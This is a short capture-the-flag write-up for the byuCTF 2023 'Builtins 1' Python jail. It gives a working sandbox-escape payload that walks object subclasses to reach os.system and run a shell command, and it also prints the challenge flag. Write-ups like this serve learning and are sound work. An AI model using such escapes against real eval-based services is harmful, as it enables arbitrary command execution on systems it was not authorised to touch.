# byuCTF 2023 - Builtins 1 (Jail)

__Description:__

>The Docker container running the jail uses

>Per usual, the flag is stored in ./flag.txt

There was the following challenge code:

__b1.py__

```python
print(eval(input("code> "), {"__builtins__": {}}, {"__builtins__": {}}))
```

With the following input I found out which python classes are all running in the system...

`''.__class__.__mro__[1].__subclasses__()`

...and got to see a long array with all classes.

Online I found out that it is probably possible to call `sys` from the class `<class 'codecs.StreamReaderWriter'>` and formed the following bypass:

`''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__["sys"].modules["os"].system("cat ./flag.txt")`

Flag: `byuctf{no_builtins?_no_problem}`
